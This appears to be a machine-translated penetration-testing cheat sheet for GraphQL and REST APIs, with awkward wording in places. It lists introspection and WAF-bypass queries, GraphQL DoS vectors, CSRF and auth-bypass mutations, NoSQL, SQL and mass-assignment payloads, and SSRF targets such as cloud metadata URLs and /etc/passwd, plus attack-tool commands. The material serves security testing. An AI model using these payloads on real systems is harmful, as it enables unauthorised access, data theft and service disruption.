# REST + GraphQL in-depth test

## GraphQL Complete list of security tests

### introspection detection (level three downgrade)

```graphql
# Level 1 — Standard introspection
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — streamlined introspection (bypass WAF)
{ __schema { types { name } } }

# Level 3 — Minimum detection
{ __type(name: "Query") { name } }
```

### DoS attack vector

```graphql
# alias overload
query { a1: __typename a2: __typename ... a100: __typename }

# batch query overload
[query1, query2, ..., query10]

# loop query
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# command overload
query { __typename @skip(if: false) @include(if: true) ... }
```

### authorized test

```graphql
# GET mutation (CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# batch query bypasses authentication
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API in-depth test

### The method controls the matrix

| endpoint | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ Accessible | Test unauthorized creation | Test batch coverage | Test field injection | Test cascade deletion | Information leakage |
| /users/me | Benchmark | — | Test self-right escalation | Test field append | Test self-deletion | — |

### parameters are injected into

```json
//NoSQL injection
{"username": {"$gt": ""}, "password": {"$ne": ""}}

//batch assignment
{"email": "user@example.com", "role": "admin", "isAdmin": true}

//Parameter contamination
GET /api/users?role=user&role=admin

//JSON array injection
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
Common SSRF parameters: webhook_url, callback_url, avatar_url, import_url, 
                redirect_uri, file_url, proxy_url, image_url
Test: http://169.254.169.254/latest/meta-data/ (AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## automation tool chain

### Vespasian (flow driven specification generation)

```bash
# crawls  from headless browsers
vespasian crawl --url https://target.com --depth 3

# import  from Burp/HAR
vespasian import --file traffic.har

# export OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy (LLM attack generation)

```bash
# Spec-based automatic test
entropy --spec api-spec.yaml --live --persona all

# Five concurrent personalities:
# - malicious_insider: IDOR/batch assignment/privilege elevation
# - bot_swarm: Speed ​​limit bypass/DoS/automated abuse
# - penetration_tester: injection/authentication bypass
# - impatient_consumer: Race condition/error handling
# - confused_user: unexpected input/bounds test

# CI mode
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8-stage pipeline)

```bash
# Phase 1-3: GraphQL Recon → Exploit → Explode
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST abuse of
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: Speed ​​limit bypass
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema Harvest
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
